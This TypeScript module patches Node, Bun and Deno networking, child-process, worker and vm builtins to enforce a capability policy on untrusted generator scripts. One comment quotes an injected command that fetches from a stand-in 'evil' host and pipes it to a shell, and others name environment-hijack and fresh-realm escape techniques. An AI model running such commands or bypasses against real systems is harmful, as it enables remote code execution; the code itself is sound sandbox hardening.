import { createRequire } from "node:module";
import type { CapabilityPolicy } from "./capability-policy";
import { scrubChildEnv } from "./enforced-env";
import { NetworkPolicyError, netTargetFromUrl } from "./enforced-net";
import { ProcessPolicyError } from "./enforced-process";

/**
 * In-process interception of the built-in module bindings a script can reach
 * *without* going through `ctx.sys` — raw TCP sockets and direct child-process
 * spawns — so that `net` / `process` enforcement is not limited to the global
 * `fetch` and `ctx.sys.proc.spawn` surfaces.
 *
 * ## Why in-process (not a `--import` preload / Bun plugin)
 *
 * Generator scripts run in *this* bridge process and are `import()`ed lazily,
 * only after {@link installGlobalEnforcement} has run at startup. Patching the
 * builtins here therefore happens strictly *before* any untrusted script is
 * even loaded, so a script cannot capture a pre-patch reference — the same
 * guarantee a separate preload file would give, without shipping one. (A
 * separate preload only matters when the untrusted code is the process's own
 * entrypoint, which is never the case here.)
 *
 * For the exports patch to reach Bun (which snapshots a module's ESM named
 * bindings at its *first* import) the mutation must happen before that first
 * import. The bridge deliberately has **no** eager `import` of
 * `node:child_process` anywhere in its startup graph (see `enforced-process.ts`,
 * which `require`s `spawn` lazily precisely for this reason), so this patch runs
 * first and the generator script's later `import { spawn }` observes it.
 *
 * ## Reach and honest limits
 *
 * This is **defense-in-depth**, not an un-bypassable floor. It closes the
 * common, ergonomic bypasses (`import { connect } from "node:net"`,
 * `http.request(...)`, `child_process.spawn(...)`, `Deno.connect(...)`,
 * `new Deno.Command(...)`), the non-TCP / non-`fetch` egress paths (`node:dgram`
 * UDP, the global `WebSocket`, `node:http2`), and the **fresh-realm** escapes a
 * script could otherwise use to run un-patched code (`worker_threads.Worker`,
 * `node:vm` new-context execution) — which matter most on Node/Bun, where the
 * shim is the *only* per-host/program narrowing (no `--allow-net`/`--allow-run`
 * floor). It cannot stop a script that re-derives a binding through FFI /
 * N-API / `process.binding`, or a raw syscall. The un-bypassable confinement
 * remains the runtime's own launch flags (Deno `--allow-net` / `--allow-run`)
 * and the OS sandbox (Landlock on Linux, AppContainer on Windows).
 *
 * Every patch is best-effort and guarded: a runtime that lacks a given builtin
 * (or forbids mutating it) simply keeps the un-patched binding rather than
 * failing the run.
 */

/** A resolved TCP target extracted from a connect call. */
export interface NetTarget {
    host: string;
    port: number;
}

/**
 * Thrown when a script tries to enter a **fresh realm** (`worker_threads.Worker`,
 * `node:vm` new-context execution) while the shim is responsible for `net` or
 * `process`. A fresh realm gets its own, un-patched module registry and globals,
 * so the in-process interception here would not apply inside it — on Node/Bun,
 * where the shim is the sole per-host/program narrowing, that is a complete
 * escape. We therefore deny the realm outright rather than let it run unconfined.
 */
export class RealmPolicyError extends Error {
    constructor(feature: string) {
        super(
            `capability policy denied \`${feature}\`: a fresh realm cannot be ` +
                `confined by the in-process net/process enforcement, so it is ` +
                `refused while this generator's \`net\`/\`process\` policy is active`,
        );
        this.name = "RealmPolicyError";
    }
}

/** The default host Node assumes when a `connect` call omits one. */
const DEFAULT_CONNECT_HOST = "localhost";

/**
 * Extract the TCP `{ host, port }` a `net`/`tls` connect call targets, from the
 * several overloaded argument shapes:
 *
 * * `connect(port[, host][, listener])`
 * * `connect(options[, listener])` where `options` has `port` (+ optional `host`)
 * * `connect(path[, listener])` / `{ path }` — a Unix-domain / named-pipe IPC
 *   endpoint that has no `host:port`
 *
 * Returns `null` when the target is an IPC endpoint or cannot be determined; the
 * caller then lets the connection proceed (the runtime flag / OS sandbox is the
 * floor for what this layer cannot resolve). `net` policy governs outbound TCP.
 */
export function netTargetFromConnectArgs(args: unknown[]): NetTarget | null {
    const first = args[0];

    // `net.connect`/`net.createConnection` normalize their overloads into a
    // single `[options, callback]` array before invoking
    // `Socket.prototype.connect`, so the patched prototype receives that array
    // rather than the raw call form. Unwrap it and re-extract. (A direct
    // `socket.connect(port, host)` on a Socket instance still arrives raw.)
    if (Array.isArray(first)) {
        return netTargetFromConnectArgs(first);
    }

    if (typeof first === "number") {
        const host =
            typeof args[1] === "string" ? args[1] : DEFAULT_CONNECT_HOST;
        return { host, port: first };
    }

    // A string first argument is an IPC path (Unix socket / Windows pipe).
    if (typeof first === "string") {
        return null;
    }

    if (first && typeof first === "object") {
        const options = first as Record<string, unknown>;
        // IPC endpoint — no host:port to authorize.
        if (typeof options.path === "string") {
            return null;
        }
        if (options.port !== undefined) {
            const port = Number(options.port);
            if (Number.isFinite(port)) {
                const host =
                    typeof options.host === "string"
                        ? options.host
                        : DEFAULT_CONNECT_HOST;
                return { host, port };
            }
        }
    }

    return null;
}

/**
 * Extract the `{ host, port }` a `dgram` (UDP) `socket.send(...)` targets. UDP is
 * connectionless, so the destination rides on each `send`; the overloads are:
 *
 * * `send(msg, port, address?, cb?)`
 * * `send(msg, offset, length, port, address?, cb?)`
 * * `send(msg, cb?)` on a *connected* socket — no explicit target (the prior
 *   `connect` was already authorized), so this yields `null`.
 *
 * `port` is a number and `address` the string immediately after it (defaulting
 * to localhost when omitted). We locate the port as the last numeric argument
 * that is followed by either a string address or the end/callback, which
 * distinguishes it from the `offset`/`length` numbers that precede it.
 */
export function netTargetFromDgramSend(args: unknown[]): NetTarget | null {
    // Scan from the right for a `number` that is plausibly the port: it is
    // followed by nothing, a callback, or the string address. The 6-arg form's
    // `offset`/`length` are always followed by more numbers, so they are skipped.
    for (let i = args.length - 1; i >= 1; i--) {
        if (typeof args[i] === "number") {
            const next = args[i + 1];
            const host = typeof next === "string" ? next : DEFAULT_CONNECT_HOST;
            const port = args[i] as number;
            return Number.isFinite(port) ? { host, port } : null;
        }
    }
    return null;
}

/**
 * Extract the `{ host, port }` a `dgram` `socket.connect(port, address?, cb?)`
 * pins the socket to. `address` defaults to localhost when omitted.
 */
export function netTargetFromDgramConnect(args: unknown[]): NetTarget | null {
    if (typeof args[0] !== "number" || !Number.isFinite(args[0])) {
        return null;
    }
    const host = typeof args[1] === "string" ? args[1] : DEFAULT_CONNECT_HOST;
    return { host, port: args[0] };
}

/**
 * Extract the program a *direct* (non-shell) child-process call executes:
 * `spawn`/`spawnSync`/`execFile`/`execFileSync`/`fork` take the program as their
 * first argument.
 *
 * Returns `null` when no program can be determined; the caller then lets the
 * spawn proceed (the runtime `--allow-run` / OS sandbox is the floor).
 */
export function programFromArg(arg: unknown): string | null {
    if (typeof arg !== "string" || arg.length === 0) {
        return null;
    }
    return arg;
}

/**
 * The shell executable a runtime spawns for a *shell* invocation, mirroring the
 * Node/Bun defaults: `/bin/sh` on POSIX and `%ComSpec%` (or `cmd.exe`) on
 * Windows. This is the executable that actually becomes the child process for
 * `exec`/`execSync` and any `{ shell: true }` spawn — the inner command line is
 * merely that shell's argv.
 *
 * INVARIANT (do not "fix"): this must return the shell the runtime *hardcodes*,
 * which is `/bin/sh` — NOT the user's login shell. `exec` deliberately ignores
 * `$SHELL`, so reading `$SHELL`/`process.env.SHELL` here would both diverge from
 * what actually runs and pull in an attacker-influenced value (a generator
 * script can set `process.env.SHELL` in-process before calling `exec`).
 *
 * This value is the *sole* authority only for the SYNC family
 * (`execSync`/`spawnSync({shell:true})`), which does not route through the
 * `ChildProcess.prototype.spawn` chokepoint; for the ASYNC family the chokepoint
 * re-checks the runtime-resolved `file` (also the shell), so the two agree. A
 * wrong guess can only ever over-restrict (deny), never under-authorize.
 */
export function defaultShellProgram(): string {
    const proc = (
        globalThis as {
            process?: {
                platform?: string;
                env?: Record<string, string | undefined>;
            };
        }
    ).process;
    if (proc?.platform === "win32") {
        return proc.env?.ComSpec ?? "cmd.exe";
    }
    return "/bin/sh";
}

/**
 * When a child-process call requests a shell, the shell executable it will run:
 * an explicit `{ shell: "<path>" }` override, or the platform
 * {@link defaultShellProgram} for `{ shell: true }`. Returns `null` when no
 * shell is requested (a direct spawn).
 *
 * This is the crux of the *shell-as-program* model: a shell invocation runs an
 * *arbitrary* command line, so the only meaningful thing to authorize is the
 * shell binary itself — never the first token of the (unparsed, injectable)
 * command line. `exec("git; curl evil | sh")` therefore authorizes the shell,
 * not `git`, and is denied unless the `process` policy actually grants the
 * shell — exactly as an explicit `spawn("/bin/sh", ["-c", …])` already is.
 */
export function shellFromOptions(args: readonly unknown[]): string | null {
    for (const arg of args) {
        if (arg && typeof arg === "object" && !Array.isArray(arg)) {
            const shell = (arg as { shell?: unknown }).shell;
            if (typeof shell === "string" && shell.length > 0) {
                return shell;
            }
            if (shell === true) {
                return defaultShellProgram();
            }
        }
    }
    return null;
}

/**
 * The program a spawn-family call (`spawn`/`spawnSync`/`execFile`/…) executes:
 * the shell binary when a `{ shell }` option is requested (see
 * {@link shellFromOptions}), otherwise the direct executable
 * ({@link programFromArg} on the first argument).
 */
export function programFromSpawnFamilyArgs(
    args: readonly unknown[],
): string | null {
    return shellFromOptions(args) ?? programFromArg(args[0]);
}

/**
 * The program an `exec`/`execSync` call executes. These forms *always* run
 * through a shell, so the child process is the shell binary — an explicit
 * `{ shell }` override or {@link defaultShellProgram} — regardless of the
 * command line's contents. Returns `null` when there is no command line to run.
 */
export function programFromExecArgs(args: readonly unknown[]): string | null {
    const commandLine = args[0];
    if (typeof commandLine !== "string" || commandLine.trim().length === 0) {
        return null;
    }
    return shellFromOptions(args) ?? defaultShellProgram();
}

/**
 * The normalized options object `ChildProcess.prototype.spawn(options)` receives,
 * from which the program can be recovered. Node/Bun/Deno all populate the same
 * shape: `file` is the resolved executable. For a *shell* invocation (`exec(...)`
 * or `spawn(cmd, { shell: true })`) the runtime has already resolved `file` to
 * the shell binary itself, so reading `file` authorizes the shell — the twin of
 * {@link programFromExecArgs} — with no need to parse the command line.
 */
interface SpawnProtoOptions {
    file?: unknown;
}

/**
 * Recover the program a `ChildProcess.prototype.spawn(options)` call will
 * execute. Because the runtime resolves `file` to the shell binary for a shell
 * invocation and to the executable for a direct spawn, reading `file` yields the
 * right answer for both — agreeing with the export-level extraction
 * ({@link programFromSpawnFamilyArgs} / {@link programFromExecArgs}) so the two
 * interception points never disagree.
 */
export function programFromSpawnOptions(options: unknown): string | null {
    if (!options || typeof options !== "object") {
        return null;
    }
    const { file } = options as SpawnProtoOptions;
    return programFromArg(file);
}

/** Authorize a TCP target against the `net` policy, throwing when denied. */
function enforceNet(policy: CapabilityPolicy, target: NetTarget | null): void {
    if (target && !policy.checkNet(target.host, target.port)) {
        throw new NetworkPolicyError(target.host, target.port);
    }
}

/** Authorize a program against the `process` policy, throwing when denied. */
function enforceProgram(
    policy: CapabilityPolicy,
    program: string | null,
): void {
    if (program !== null && !policy.checkProcess(program)) {
        throw new ProcessPolicyError(program);
    }
}

/**
 * Replace an own, writable, function-valued property with a wrapper, returning
 * whether the swap succeeded. Guards against read-only / getter-only builtins
 * so a locked-down runtime never turns a patch attempt into a hard failure.
 */
function tryPatch<T extends Record<string, unknown>>(
    target: T | undefined,
    key: keyof T & string,
    wrap: (original: (...args: unknown[]) => unknown) => T[typeof key],
): boolean {
    try {
        const original = target?.[key];
        if (typeof original !== "function") {
            return false;
        }
        const descriptor = Object.getOwnPropertyDescriptor(target, key);
        if (descriptor && descriptor.writable === false && !descriptor.set) {
            return false;
        }
        (target as Record<string, unknown>)[key] = wrap(
            original as (...args: unknown[]) => unknown,
        );
        return true;
    } catch {
        return false;
    }
}

/**
 * Values the shim has installed as locked globals. Lets a repeat install detect
 * "already ours" and skip re-defining, rather than throwing against the now
 * non-configurable slot — the marker, not the slot staying redefinable, is what
 * keeps installation idempotent.
 */
const enforcedGlobals = new WeakSet<object>();

/**
 * Redefine `target[name]` with the enforced `value` as a non-writable,
 * **non-configurable** own property, so untrusted code can neither reassign it
 * (`writable: false`) nor `delete`/redefine it (`configurable: false`) to
 * recover the raw global. A repeat install is a no-op: if the slot already holds
 * a value this shim locked, it is left intact instead of triggering a throwing
 * redefinition. Returns whether the enforced value is in place afterward (only
 * `false` on a runtime that forbids the redefinition outright). Exported so the
 * sibling `fetch` lock in `index.ts` shares the same policy.
 */
export function defineEnforcedGlobal(
    target: Record<string, unknown>,
    name: string,
    value: unknown,
): boolean {
    const existing = Object.getOwnPropertyDescriptor(target, name);
    const current = existing?.value;
    if (
        (typeof current === "object" || typeof current === "function") &&
        current !== null &&
        enforcedGlobals.has(current as object)
    ) {
        return true; // already locked by us — keep the sealed slot as-is
    }
    try {
        if (
            (typeof value === "object" || typeof value === "function") &&
            value !== null
        ) {
            enforcedGlobals.add(value as object);
        }
        Object.defineProperty(target, name, {
            value,
            writable: false,
            configurable: false,
            enumerable: true,
        });
        return true;
    } catch {
        return false;
    }
}

/**
 * Emit a loud warning when a *critical* interception point could not be patched
 * while the shim is responsible for its domain. Unlike an optional patch (a
 * runtime simply lacking a given builtin, which is expected), a failed critical
 * patch on a runtime that *has* the surface is a real enforcement gap, so it
 * must not fail silently. We warn rather than throw because the un-bypassable
 * floor (launch flags / OS sandbox) may still cover it, and aborting the whole
 * run on a best-effort defense-in-depth layer would be worse than a visible
 * warning that the operator (and tests) can see.
 */
function warnUnpatched(patched: boolean, chokepoint: string): void {
    if (!patched) {
        console.warn(
            `[omni] capability enforcement could not patch ${chokepoint}; ` +
                `direct use of it is NOT narrowed by this generator's policy ` +
                `(the runtime launch flags / OS sandbox remain the only floor)`,
        );
    }
}

/**
 * Injectable environment for {@link installBuiltinModuleEnforcement}. Defaults
 * to the real process (a `createRequire` and `globalThis`); tests pass fakes so
 * they can assert the realm/global gating without mutating the shared process
 * (which would leak `node:vm`/`WebSocket` patches across test files).
 */
export interface EnforcementEnv {
    nodeRequire?: NodeJS.Require;
    globalTarget?: Record<string, unknown>;
}

/**
 * Install best-effort, in-process enforcement of the built-in `net`/`process`
 * bindings for the given `policy`. Only the domains the policy is responsible
 * for are patched; a domain absent from the residual is left untouched (the
 * runtime already confines it precisely). Safe to call more than once and safe
 * on any runtime — every patch is guarded.
 */
export function installBuiltinModuleEnforcement(
    policy: CapabilityPolicy,
    env: EnforcementEnv = {},
): void {
    let nodeRequire = env.nodeRequire;
    if (!nodeRequire) {
        try {
            nodeRequire = createRequire(import.meta.url);
        } catch {
            nodeRequire = undefined;
        }
    }
    const globalTarget =
        env.globalTarget ?? (globalThis as unknown as Record<string, unknown>);

    if (policy.hasNet()) {
        // The Socket.prototype.connect chokepoint is critical (it also backs
        // `node:http(s)` / undici `fetch`); a silent miss would leave raw TCP
        // un-narrowed, so surface it loudly.
        warnUnpatched(patchNet(policy, nodeRequire), "node:net Socket.connect");
        patchDenoNet(policy, globalTarget);
        patchDgram(policy, nodeRequire);
        patchHttp2(policy, nodeRequire);
        warnUnpatched(
            patchWebSocket(policy, globalTarget),
            "the global WebSocket",
        );
    }
    if (policy.hasProcess()) {
        warnUnpatched(
            patchChildProcess(policy, nodeRequire),
            "node:child_process",
        );
        patchDenoProcess(policy, globalTarget);
    }
    // A fresh realm re-imports the builtins we patched here as un-patched
    // copies, so it must be gated whenever the shim owns either domain.
    if (policy.hasNet() || policy.hasProcess()) {
        patchWorkerThreads(policy, nodeRequire, globalTarget);
        patchVm(policy, nodeRequire);
    }

    // Propagate the mutated CJS export objects to ESM live bindings
    // (`import { connect } from "node:net"`). Node-only; a no-op elsewhere.
    try {
        const mod = nodeRequire?.("node:module") as
            | { syncBuiltinESMExports?: () => void }
            | undefined;
        mod?.syncBuiltinESMExports?.();
    } catch {
        // best-effort
    }
}

/**
 * Patch `node:net` and `node:tls` so raw sockets are authorized. The chokepoint
 * is `net.Socket.prototype.connect`: `net.connect`/`createConnection` funnel
 * through it, and `node:http(s)` / undici's `fetch` open their sockets through
 * it too, so a single prototype patch covers them all. `tls.connect` is patched
 * as well since its connection path does not always reuse that prototype method.
 */
function patchNet(
    policy: CapabilityPolicy,
    nodeRequire: NodeJS.Require | undefined,
): boolean {
    if (!nodeRequire) {
        return false;
    }
    let connectPatched = false;
    try {
        const net = nodeRequire("node:net") as {
            Socket?: { prototype?: Record<string, unknown> };
        };
        connectPatched = tryPatch(
            net.Socket?.prototype,
            "connect",
            (original) =>
                function patchedConnect(this: unknown, ...args: unknown[]) {
                    enforceNet(policy, netTargetFromConnectArgs(args));
                    return original.apply(this, args);
                },
        );
    } catch {
        // no node:net on this runtime
    }

    try {
        const tls = nodeRequire("node:tls") as Record<string, unknown>;
        tryPatch(
            tls,
            "connect",
            (original) =>
                function patchedTlsConnect(this: unknown, ...args: unknown[]) {
                    enforceNet(policy, netTargetFromConnectArgs(args));
                    return original.apply(this, args);
                },
        );
    } catch {
        // no node:tls on this runtime
    }
    return connectPatched;
}

/** The trusted `PATH` to pin into confined grandchildren (Deno-safe read). */
function trustedPath(): string | undefined {
    try {
        return process.env.PATH;
    } catch {
        return undefined;
    }
}

/**
 * Return `args` with every options object that carries an explicit `env` having
 * that env scrubbed of code-injection vectors and its `PATH` pinned to the
 * trusted value (see {@link scrubChildEnv}). This closes the environment-hijack
 * path on the *direct* `node:child_process` surface (mirroring `confinedEnv` on
 * the `ctx.sys.proc.spawn` path): a program the `process` policy authorized
 * cannot be turned into arbitrary code execution via a caller-supplied
 * `LD_PRELOAD` / `NODE_OPTIONS` / hijacked `PATH`. Args with no explicit `env`
 * option are returned untouched — the grandchild then inherits the runtime's
 * already-scrubbed environment.
 */
function withScrubbedSpawnEnv(args: unknown[]): unknown[] {
    let changed = false;
    const path = trustedPath();
    const out = args.map((arg) => {
        if (
            arg &&
            typeof arg === "object" &&
            !Array.isArray(arg) &&
            Object.hasOwn(arg, "env")
        ) {
            const env = (arg as { env?: unknown }).env;
            if (env && typeof env === "object") {
                changed = true;
                return {
                    ...(arg as Record<string, unknown>),
                    env: scrubChildEnv(
                        env as Record<string, string | undefined>,
                        path,
                    ),
                };
            }
        }
        return arg;
    });
    return changed ? out : args;
}

/**
 * Patch `node:child_process` so direct-import spawns are authorized.
 *
 * Two complementary interception points, because they cover different runtimes:
 *
 * 1. **The module exports** (`spawn`, `spawnSync`, `exec`, …). The
 *    argument-first functions take the program as the first argument; the shell
 *    forms take a command line whose first token is the program. Mutating these
 *    reaches `import { spawn } from "node:child_process"` on Node (live ESM
 *    bindings, kept in sync by {@link installBuiltinModuleEnforcement}), but
 *    **not** on Bun, which snapshots ESM named bindings at first import.
 * 2. **`ChildProcess.prototype.spawn`** — the shared-prototype chokepoint the
 *    entire *async* family (`spawn`/`exec`/`execFile`/`fork`) funnels through
 *    (`new ChildProcess().spawn(options)`). Patching a shared prototype method
 *    propagates across module graphs regardless of a runtime's binding
 *    snapshotting (the same mechanism as the `net.Socket.prototype.connect`
 *    patch), so it closes the async family on Bun where the exports patch
 *    cannot. The *sync* family (`spawnSync`/`execSync`/`execFileSync`) creates
 *    no `ChildProcess` and does not route through the prototype, so it relies
 *    solely on the exports patch (1) — which reaches Bun too, because the bridge
 *    keeps its startup graph free of any eager `import` of the builtin (see the
 *    module doc and `enforced-process.ts`).
 */
function patchChildProcess(
    policy: CapabilityPolicy,
    nodeRequire: NodeJS.Require | undefined,
): boolean {
    if (!nodeRequire) {
        return false;
    }
    let cp: Record<string, unknown>;
    try {
        cp = nodeRequire("node:child_process") as Record<string, unknown>;
    } catch {
        return false;
    }

    let anyExportPatched = false;
    for (const key of [
        "spawn",
        "spawnSync",
        "execFile",
        "execFileSync",
        "fork",
    ]) {
        anyExportPatched =
            tryPatch(
                cp,
                key,
                (original) =>
                    function patchedSpawn(this: unknown, ...args: unknown[]) {
                        enforceProgram(
                            policy,
                            programFromSpawnFamilyArgs(args),
                        );
                        return original.apply(this, withScrubbedSpawnEnv(args));
                    },
            ) || anyExportPatched;
    }

    for (const key of ["exec", "execSync"]) {
        tryPatch(
            cp,
            key,
            (original) =>
                function patchedExec(this: unknown, ...args: unknown[]) {
                    enforceProgram(policy, programFromExecArgs(args));
                    return original.apply(this, withScrubbedSpawnEnv(args));
                },
        );
    }

    // The shared-prototype chokepoint: closes the async family on runtimes whose
    // ESM bindings the exports patch above cannot reach (Bun). Reads the program
    // from the normalized options the runtime hands `spawn`, matching the
    // exports-level extraction so the two agree when both fire (Node/Deno).
    const childProcess = cp.ChildProcess as
        | { prototype?: Record<string, unknown> }
        | undefined;
    const protoPatched = tryPatch(
        childProcess?.prototype,
        "spawn",
        (original) =>
            function patchedProtoSpawn(this: unknown, ...args: unknown[]) {
                enforceProgram(policy, programFromSpawnOptions(args[0]));
                return original.apply(this, args);
            },
    );
    // Either interception point alone closes the common paths (exports reach the
    // sync family everywhere; the prototype closes the async family on Bun); a
    // gap only exists if *neither* took.
    return anyExportPatched || protoPatched;
}

/**
 * Patch Deno's native networking globals (`Deno.connect`, `Deno.connectTls`).
 * Deno's own `fetch` is intercepted by the global-`fetch` patch; these cover raw
 * TCP/TLS sockets opened through the `Deno` namespace.
 */
function patchDenoNet(
    policy: CapabilityPolicy,
    globalTarget: Record<string, unknown>,
): void {
    const deno = globalTarget.Deno as Record<string, unknown> | undefined;
    if (!deno) {
        return;
    }
    for (const key of ["connect", "connectTls"]) {
        tryPatch(
            deno,
            key,
            (original) =>
                function patchedDenoConnect(this: unknown, ...args: unknown[]) {
                    const options = args[0] as
                        | { hostname?: unknown; port?: unknown; path?: unknown }
                        | undefined;
                    if (options && typeof options === "object") {
                        // Unix-domain transport has no host:port.
                        if (typeof options.path !== "string") {
                            const port = Number(options.port);
                            if (Number.isFinite(port)) {
                                const host =
                                    typeof options.hostname === "string"
                                        ? options.hostname
                                        : DEFAULT_CONNECT_HOST;
                                enforceNet(policy, { host, port });
                            }
                        }
                    }
                    return original.apply(this, args);
                },
        );
    }
}

/**
 * Patch Deno's child-process globals: the modern `Deno.Command` constructor and
 * the deprecated `Deno.run`.
 */
function patchDenoProcess(
    policy: CapabilityPolicy,
    globalTarget: Record<string, unknown>,
): void {
    const deno = globalTarget.Deno as Record<string, unknown> | undefined;
    if (!deno) {
        return;
    }

    tryPatch(deno, "Command", (Original) => {
        const Wrapped = function (this: unknown, ...args: unknown[]) {
            enforceProgram(policy, programFromArg(args[0]));
            // `Deno.Command` is a class; reconstruct with `new`.
            return Reflect.construct(
                Original as unknown as new (
                    ...a: unknown[]
                ) => unknown,
                args,
            );
        };
        return Wrapped as unknown as Record<string, unknown>["Command"];
    });

    tryPatch(
        deno,
        "run",
        (original) =>
            function patchedDenoRun(this: unknown, ...args: unknown[]) {
                const options = args[0] as { cmd?: unknown } | undefined;
                const cmd = options?.cmd;
                if (Array.isArray(cmd)) {
                    enforceProgram(policy, programFromArg(cmd[0]));
                }
                return original.apply(this, args);
            },
    );
}

/**
 * Patch `node:dgram` so UDP egress is authorized against the `net` policy. UDP
 * is connectionless, so both the per-datagram `send(...)` target and a
 * `connect(...)` binding are checked at the shared `dgram.Socket.prototype`
 * chokepoint (the twin of the `net.Socket.prototype.connect` approach). `fetch`
 * and TCP never route here; this closes the raw-UDP path a script could
 * otherwise use to exfiltrate to an un-permitted host.
 */
function patchDgram(
    policy: CapabilityPolicy,
    nodeRequire: NodeJS.Require | undefined,
): void {
    if (!nodeRequire) {
        return;
    }
    let proto: Record<string, unknown> | undefined;
    try {
        const dgram = nodeRequire("node:dgram") as {
            Socket?: { prototype?: Record<string, unknown> };
        };
        proto = dgram.Socket?.prototype;
    } catch {
        return; // no node:dgram on this runtime
    }
    tryPatch(
        proto,
        "send",
        (original) =>
            function patchedSend(this: unknown, ...args: unknown[]) {
                enforceNet(policy, netTargetFromDgramSend(args));
                return original.apply(this, args);
            },
    );
    tryPatch(
        proto,
        "connect",
        (original) =>
            function patchedDgramConnect(this: unknown, ...args: unknown[]) {
                enforceNet(policy, netTargetFromDgramConnect(args));
                return original.apply(this, args);
            },
    );
}

/**
 * Patch `node:http2` so `http2.connect(authority)` is authorized. HTTP/2 opens
 * its own session socket that does not always route through the
 * `net.Socket.prototype.connect` chokepoint, so the `authority` URL is checked
 * here directly. Best-effort: absent on runtimes without `node:http2`.
 */
function patchHttp2(
    policy: CapabilityPolicy,
    nodeRequire: NodeJS.Require | undefined,
): void {
    if (!nodeRequire) {
        return;
    }
    let http2: Record<string, unknown>;
    try {
        http2 = nodeRequire("node:http2") as Record<string, unknown>;
    } catch {
        return; // no node:http2 on this runtime
    }
    tryPatch(
        http2,
        "connect",
        (original) =>
            function patchedHttp2Connect(this: unknown, ...args: unknown[]) {
                enforceNet(policy, netTargetFromUrl(args[0]));
                return original.apply(this, args);
            },
    );
}

/**
 * Patch the global `WebSocket` constructor so `new WebSocket(url)` is authorized
 * against the `net` policy. `WebSocket` is native on Deno, Bun, and Node 22+ and
 * opens its own connection *without* going through `fetch` or a `node:net`
 * socket the shim can see, so it is a distinct egress path. A `Proxy` construct
 * trap preserves the class's statics (`WebSocket.OPEN`, …), prototype, and
 * `instanceof`, and the replacement is locked non-configurable so a script
 * cannot delete it to recover the raw constructor. Returns whether a present
 * global was patched (so a genuine miss can be surfaced loudly); a runtime that
 * has no `WebSocket` at all returns `true` (nothing to narrow).
 */
function patchWebSocket(
    policy: CapabilityPolicy,
    globalTarget: Record<string, unknown>,
): boolean {
    const Original = globalTarget.WebSocket;
    if (typeof Original !== "function") {
        return true; // no global WebSocket → no egress path to narrow
    }
    try {
        const patched = new Proxy(
            Original as new (
                ...a: unknown[]
            ) => unknown,
            {
                construct(target, args, newTarget) {
                    enforceNet(policy, netTargetFromUrl(args[0]));
                    return Reflect.construct(target, args, newTarget);
                },
            },
        );
        // Lock the slot non-writable **and** non-configurable so a script can
        // neither reassign nor `delete`/redefine it back to a raw constructor;
        // a repeat install stays idempotent via the enforced-globals marker.
        return defineEnforcedGlobal(globalTarget, "WebSocket", patched);
    } catch {
        return false;
    }
}

/**
 * Gate the fresh-realm escape hatches (`worker_threads.Worker` and the global
 * `Worker`) while the shim owns `net`/`process`. A `Worker` runs on its own
 * thread with a *fresh* module registry and globals, so none of the in-process
 * patches installed here apply inside it; on Node/Bun — which have no
 * `--allow-net`/`--allow-run` floor — that is a complete bypass of the only
 * per-host/program narrowing. We therefore refuse construction outright rather
 * than let unconfined code run. (On Deno a worker cannot exceed the parent's
 * launch-flag permissions, so this is redundant-but-harmless there.)
 */
function patchWorkerThreads(
    policy: CapabilityPolicy,
    nodeRequire: NodeJS.Require | undefined,
    globalTarget: Record<string, unknown>,
): void {
    void policy;
    const denyWorker = (original: (...args: unknown[]) => unknown) =>
        function blockedWorker(this: unknown, ..._args: unknown[]): unknown {
            void original;
            throw new RealmPolicyError("worker_threads.Worker");
        };
    // The `node:worker_threads` export (Node/Bun).
    if (nodeRequire) {
        try {
            const wt = nodeRequire("node:worker_threads") as Record<
                string,
                unknown
            >;
            tryPatch(wt, "Worker", denyWorker);
        } catch {
            // no node:worker_threads on this runtime
        }
    }
    // The global `Worker` (Deno/Bun and browsers-style hosts). Locked
    // non-writable and non-configurable so a script can neither reassign nor
    // `delete`/redefine it; the enforced-globals marker keeps re-install
    // idempotent instead of relying on the slot staying redefinable.
    if (typeof globalTarget.Worker === "function") {
        defineEnforcedGlobal(
            globalTarget,
            "Worker",
            function blockedGlobalWorker(): unknown {
                throw new RealmPolicyError("Worker");
            },
        );
    }
}

/**
 * Gate `node:vm` new-context execution while the shim owns `net`/`process`.
 * Code run in a *new* vm context can be handed a custom module loader and reach
 * un-patched builtins, so the fresh-realm entry points
 * (`runInNewContext`/`runInContext`/`createContext`/`compileFunction` and the
 * `SourceTextModule` constructor) are refused. `runInThisContext` is
 * deliberately left alone: it executes in the *current*, already-patched realm,
 * so it grants no new authority. Best-effort and guarded like every other patch.
 */
function patchVm(
    policy: CapabilityPolicy,
    nodeRequire: NodeJS.Require | undefined,
): void {
    void policy;
    if (!nodeRequire) {
        return;
    }
    let vm: Record<string, unknown>;
    try {
        vm = nodeRequire("node:vm") as Record<string, unknown>;
    } catch {
        return; // no node:vm on this runtime
    }
    const deny = (feature: string) => () =>
        function blockedVm(): unknown {
            throw new RealmPolicyError(`node:vm ${feature}`);
        };
    for (const key of [
        "runInNewContext",
        "runInContext",
        "createContext",
        "compileFunction",
        "SourceTextModule",
    ]) {
        tryPatch(vm, key, deny(key));
    }
}
